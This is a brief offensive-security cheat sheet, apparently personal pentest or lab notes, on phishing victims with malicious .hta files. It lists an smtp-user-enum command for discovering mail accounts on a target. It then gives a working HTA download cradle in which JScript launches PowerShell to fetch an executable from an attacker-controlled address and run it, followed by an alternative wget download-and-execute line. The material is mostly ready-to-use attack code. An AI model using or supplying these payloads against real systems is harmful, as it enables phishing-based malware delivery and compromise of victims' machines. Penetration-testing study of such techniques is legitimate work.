## Phishing via .hta files

- if Office does not appear to be working for you, can try sending an email with a malicious .hta file link.

### Enumerating email users

Try using smtp-user-enum with the Seclists's names.txt
For the mode, use telnet to connect and try VRFY, EXPN and RCPT to see which works

```bash
smtp-user-enum -M RCPT -U /usr/share/wordlists/seclists/Usernames/Names/names.txt -D tricky.com -t 192.168.174.159
```

### PowerShell Download Cradle

```html
<html>
<head>
<script language="JScript">
var shell = new ActiveXObject("WScript.Shell");
var res = shell.Run("powershell iwr -uri http://IP:PORT/file.exe -outfile C:\\path\\to\\file.exe;C:\\path\\to\\file.exe");
</script>
</head>
<body>
<script language="JScript">
self.close();
</script>
</body>
</html>

```
if the above doesnt work try
```
var ress = shell.Run("powershell.exe wget http://172.21.23.10/inj_runner.exe -o C:\\users\\public\\runner.exe; C:\\users\\public\\runner.exe");
```
